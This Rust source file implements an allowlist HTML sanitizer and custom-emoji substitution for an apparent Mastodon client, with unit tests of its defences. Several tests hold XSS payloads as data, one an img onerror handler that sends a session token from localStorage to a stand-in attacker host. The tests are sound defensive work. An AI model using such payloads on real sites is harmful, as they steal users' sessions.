//! Allowlist HTML sanitizer and safe custom-emoji substitution.
//!
//! Mastodon hands out HTML, and a server or client that prints it as text prints `<br>`.
//! Even when an instance is trusted for the reader's own account, federated statuses, bios,
//! and translations arrive from arbitrary remote servers; interpolating them raw into
//! `inner_html` would hand those servers this origin. `lol-html` rewrites the fragment with
//! an allowlist, so the result is markup this origin chose to keep rather than markup it
//! passed through.
//!
//! What survives is what a post or bio is made of: paragraphs, breaks, emphasis, links,
//! lists, quotes and inline images (custom emoji). Everything else goes, and so does every
//! attribute that is not in [`allowed`] — which removes `style`, `onclick`, and layout
//! classes from remote instances.

use lol_html::html_content::ContentType;
use lol_html::{RewriteStrSettings, doc_comments, doc_text, element, rewrite_str};
use nodus_client_core::model::{
    Account, Conversation, CustomEmoji, Notification, SearchResults, Status,
};

/// Elements a post or bio may keep. Anything not listed is removed together with its
/// content, so a `<script>` cannot survive as text either.
const KEEP: &[&str] = &[
    "p",
    "br",
    "a",
    "span",
    "strong",
    "em",
    "b",
    "i",
    "u",
    "s",
    "del",
    "ins",
    "code",
    "pre",
    "blockquote",
    "ul",
    "ol",
    "li",
    "h1",
    "h2",
    "h3",
    "h4",
    "img",
];

/// The attributes worth keeping, per element.
fn allowed(tag: &str, name: &str) -> bool {
    matches!(
        (tag, name),
        ("a", "href" | "class" | "rel" | "target" | "title")
            | (
                "img",
                "src" | "alt" | "class" | "title" | "width" | "height"
            )
            | (
                "span" | "p" | "code" | "pre" | "blockquote" | "ul" | "ol" | "li",
                "class"
            )
    )
}

/// Whether a URL is one this page is willing to link to or load as an image.
#[must_use]
pub fn safe_url(url: &str) -> bool {
    let trimmed = url.trim_start();
    if trimmed.chars().any(char::is_control) {
        return false;
    }
    let lower = trimmed.to_ascii_lowercase();
    lower.starts_with("https://")
        || lower.starts_with("http://")
        || (lower.starts_with('/') && !lower.starts_with("//") && !lower.starts_with("/\\"))
}

/// Escapes text for HTML attributes and text nodes.
#[must_use]
pub fn escape(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    for character in text.chars() {
        match character {
            '&' => out.push_str("&amp;"),
            '<' => out.push_str("&lt;"),
            '>' => out.push_str("&gt;"),
            '"' => out.push_str("&quot;"),
            '\'' => out.push_str("&#39;"),
            other => out.push(other),
        }
    }
    out
}

/// Rewrites a status body or account bio into markup this origin is willing to render.
///
/// On a rewrite error the escaped text is returned: a post that cannot be sanitised is
/// still readable, and reading beats a blank card.
#[must_use]
pub fn body(html: &str) -> String {
    let settings = RewriteStrSettings {
        document_content_handlers: vec![doc_comments!(|comment| {
            comment.remove();
            Ok(())
        })],
        element_content_handlers: vec![element!("*", |el| {
            let tag = el.tag_name();
            if !KEEP.contains(&tag.as_str()) {
                el.remove();
                return Ok(());
            }

            // Collected first: removing while iterating borrows the same element twice.
            let doomed: Vec<String> = el
                .attributes()
                .iter()
                .filter(|attribute| !allowed(&tag, &attribute.name()))
                .map(|attribute| attribute.name().clone())
                .collect();
            for name in doomed {
                el.remove_attribute(&name);
            }

            if tag == "a" {
                let href = el.get_attribute("href").unwrap_or_default();
                if href.is_empty() || !safe_url(&href) {
                    el.remove_attribute("href");
                } else {
                    // A link out of this page opens in its own tab, and says so.
                    let _ = el.set_attribute("rel", "nofollow noopener noreferrer");
                    let _ = el.set_attribute("target", "_blank");
                }
            }
            if tag == "img" {
                let src = el.get_attribute("src").unwrap_or_default();
                if src.is_empty() || !safe_url(&src) {
                    el.remove();
                    return Ok(());
                }
                let _ = el.set_attribute("loading", "lazy");
                let _ = el.set_attribute("referrerpolicy", "no-referrer");
                if el.get_attribute("alt").is_none() {
                    let _ = el.set_attribute("alt", "");
                }
            }
            Ok(())
        })],
        ..RewriteStrSettings::default()
    };

    rewrite_str(html, settings).unwrap_or_else(|_| escape(html))
}

/// Sanitises a status body and expands the custom emoji the status declares in text nodes.
#[must_use]
pub fn prepared(content: &str, emojis: &[CustomEmoji]) -> String {
    with_emojis(&body(content), emojis)
}

/// Expands `:shortcode:` tokens inside HTML text nodes only, never inside tag attributes.
///
/// `html` must already have been sanitised by [`body`] or an escaping renderer such as
/// [`crate::mfm`]. Emoji URLs are checked with [`safe_url`], and replacement happens in a
/// single pass per text node so one emoji's attributes cannot match another emoji's token.
pub(crate) fn with_emojis(html: &str, emojis: &[CustomEmoji]) -> String {
    let entries: Vec<(String, String)> = emojis
        .iter()
        .filter_map(|emoji| {
            if emoji.shortcode.is_empty() {
                return None;
            }
            let source = if emoji.url.is_empty() {
                emoji.static_url.as_deref().unwrap_or_default()
            } else {
                emoji.url.as_str()
            };
            if source.is_empty() || !safe_url(source) {
                return None;
            }
            let token = format!(":{}:", emoji.shortcode);
            let escaped_token = escape(&token);
            let escaped_source = escape(source);
            let replacement = format!(
                "<img class=\"emoji inline-block h-[1.2em] w-auto align-[-0.2em]\" alt=\"{escaped_token}\" title=\"{escaped_token}\" loading=\"lazy\" decoding=\"async\" referrerpolicy=\"no-referrer\" src=\"{escaped_source}\">"
            );
            Some((token, replacement))
        })
        .collect();

    if entries.is_empty() || !html.contains(':') {
        return html.to_owned();
    }

    let mut text_buf = String::new();
    let mut buffered = false;
    let settings = RewriteStrSettings {
        document_content_handlers: vec![doc_text!(|chunk| {
            if !chunk.last_in_text_node() {
                text_buf.push_str(chunk.as_str());
                buffered = true;
                chunk.remove();
                return Ok(());
            }
            if buffered {
                text_buf.push_str(chunk.as_str());
                let raw_text = std::mem::take(&mut text_buf);
                buffered = false;
                let replaced = expand_emojis_in_text(&raw_text, &entries);
                chunk.replace(replaced.as_deref().unwrap_or(&raw_text), ContentType::Html);
            } else if let Some(replaced) = expand_emojis_in_text(chunk.as_str(), &entries) {
                chunk.replace(&replaced, ContentType::Html);
            }
            Ok(())
        })],
        ..RewriteStrSettings::default()
    };

    rewrite_str(html, settings).unwrap_or_else(|_| html.to_owned())
}

fn expand_emojis_in_text(text: &str, entries: &[(String, String)]) -> Option<String> {
    let mut out = String::new();
    let mut flushed = 0_usize;
    let mut pos = 0_usize;
    let mut changed = false;

    while let Some(rel) = text[pos..].find(':') {
        let colon = pos + rel;
        if let Some((token, replacement)) = entries
            .iter()
            .find(|(token, _)| text[colon..].starts_with(token.as_str()))
        {
            if !changed {
                out.reserve(text.len());
                changed = true;
            }
            out.push_str(&text[flushed..colon]);
            out.push_str(replacement);
            pos = colon + token.len();
            flushed = pos;
        } else {
            pos = colon + 1;
        }
    }

    if !changed {
        return None;
    }
    out.push_str(&text[flushed..]);
    Some(out)
}

/// Sanitises HTML fields on an [`Account`] in place.
pub fn sanitize_account(account: &mut Account) {
    account.note = body(&account.note);
}

/// Sanitises HTML fields on a [`Status`] (including nested `account` and `reblog`) in place.
pub fn sanitize_status(status: &mut Status) {
    status.content = body(&status.content);
    sanitize_account(&mut status.account);
    if let Some(reblog) = status.reblog.as_deref_mut() {
        sanitize_status(reblog);
    }
}

/// Sanitises HTML fields on a [`Notification`] in place.
pub fn sanitize_notification(notification: &mut Notification) {
    sanitize_account(&mut notification.account);
    if let Some(status) = notification.status.as_mut() {
        sanitize_status(status);
    }
}

/// Sanitises HTML fields on a [`Conversation`] in place.
pub fn sanitize_conversation(conversation: &mut Conversation) {
    for account in &mut conversation.accounts {
        sanitize_account(account);
    }
    if let Some(status) = conversation.last_status.as_mut() {
        sanitize_status(status);
    }
}

/// Sanitises HTML fields on [`SearchResults`] in place.
pub fn sanitize_search_results(results: &mut SearchResults) {
    for account in &mut results.accounts {
        sanitize_account(account);
    }
    for status in &mut results.statuses {
        sanitize_status(status);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn emoji(shortcode: &str, url: &str) -> CustomEmoji {
        CustomEmoji {
            shortcode: shortcode.to_owned(),
            url: url.to_owned(),
            static_url: None,
        }
    }

    #[test]
    fn paragraphs_and_breaks_survive() {
        let html = body("<p>one</p><p>two<br />three</p>");
        assert!(html.contains("<p>one</p>"), "{html}");
        assert!(html.contains("<br"), "{html}");
    }

    #[test]
    fn links_get_rel_and_target() {
        let html = body("<p><a href=\"https://example.org/x\">x</a></p>");
        assert!(html.contains("href=\"https://example.org/x\""), "{html}");
        assert!(
            html.contains("rel=\"nofollow noopener noreferrer\""),
            "{html}"
        );
        assert!(html.contains("target=\"_blank\""), "{html}");
    }

    #[test]
    fn javascript_urls_lose_their_href() {
        let html = body("<a href=\"javascript:alert(1)\">x</a>");
        assert!(!html.contains("javascript:"), "{html}");
    }

    #[test]
    fn scripts_and_handlers_are_removed() {
        let html = body("<p onclick=\"steal()\">hi<script>alert(1)</script></p>");
        assert!(!html.contains("script"), "{html}");
        assert!(!html.contains("onclick"), "{html}");
        assert!(html.contains("hi"), "{html}");
    }

    #[test]
    fn inline_styles_are_dropped() {
        let html = body("<p style=\"position:fixed\">x</p>");
        assert!(!html.contains("style"), "{html}");
    }

    #[test]
    fn emoji_images_keep_their_source() {
        let html = body("<img src=\"https://example.org/e.png\" alt=\":blob:\">");
        assert!(html.contains("src=\"https://example.org/e.png\""), "{html}");
        assert!(html.contains("referrerpolicy=\"no-referrer\""), "{html}");
    }

    #[test]
    fn prepared_strips_img_onerror_xss() {
        let payload = "<p>hi</p><img src=x onerror=\"fetch('https://attacker.tld/?'+localStorage.getItem('nodus.session'))\">";
        let out = prepared(payload, &[]);
        assert!(!out.contains("onerror"), "{out}");
        assert!(!out.contains("attacker.tld"), "{out}");
        assert!(out.contains("<p>hi</p>"), "{out}");
    }

    #[test]
    fn with_emojis_never_expands_inside_attributes() {
        let html = "<p><a href=\"https://example.com/:wave:\">say :wave:</a></p>";
        let out = prepared(html, &[emoji("wave", "https://cdn.test/wave.png")]);
        assert!(
            out.contains("href=\"https://example.com/:wave:\""),
            "attribute should stay untouched: {out}"
        );
        assert_eq!(
            out.matches("src=\"https://cdn.test/wave.png\"").count(),
            1,
            "text node token should expand once: {out}"
        );
    }

    #[test]
    fn with_emojis_does_not_nest_inside_existing_emoji_img_attributes() {
        let html =
            "<p><img src=\"https://cdn.test/wave.png\" alt=\":wave:\" title=\":wave:\"> :wave:</p>";
        let out = prepared(html, &[emoji("wave", "https://cdn.test/wave.png")]);
        assert!(
            out.contains("alt=\":wave:\""),
            "existing img alt must stay intact: {out}"
        );
        assert_eq!(
            out.matches("src=\"https://cdn.test/wave.png\"").count(),
            2,
            "existing img + expanded text token: {out}"
        );
    }

    #[test]
    fn with_emojis_does_not_chain_replace_across_urls() {
        let emojis = [
            emoji("a", "https://cdn.test/:b:.png"),
            emoji("b", "https://evil.test/b.png"),
        ];
        let out = prepared("<p>:a:</p>", &emojis);
        assert!(out.contains("src=\"https://cdn.test/:b:.png\""), "{out}");
        assert!(!out.contains("evil.test"), "{out}");
    }

    #[test]
    fn with_emojis_rejects_unsafe_urls() {
        let emojis = [
            emoji("bad1", "javascript:alert(1)"),
            emoji("bad2", "data:image/svg+xml,<svg onload=alert(1)>"),
            emoji("bad3", "//evil.test/x.png"),
            CustomEmoji {
                shortcode: "bad4".to_owned(),
                url: String::new(),
                static_url: Some("javascript:alert(2)".to_owned()),
            },
        ];
        let out = prepared("<p>:bad1: :bad2: :bad3: :bad4:</p>", &emojis);
        assert!(!out.contains("<img"), "{out}");
        assert!(out.contains(":bad1: :bad2: :bad3: :bad4:"), "{out}");
    }

    #[test]
    fn with_emojis_escapes_quotes_in_shortcode() {
        let emojis = [emoji("x\" onerror=\"alert(1)", "https://cdn.test/e.png")];
        let out = with_emojis("<p>:x\" onerror=\"alert(1):</p>", &emojis);
        assert!(!out.contains("onerror=\"alert"), "{out}");
        assert!(out.contains("&quot;"), "{out}");
    }

    #[test]
    fn with_emojis_ignores_empty_shortcode() {
        let out = prepared(
            "<p>std::vec::Vec</p>",
            &[emoji("", "https://cdn.test/e.png")],
        );
        assert!(!out.contains("<img"), "{out}");
        assert!(out.contains("std::vec::Vec"), "{out}");
    }
}
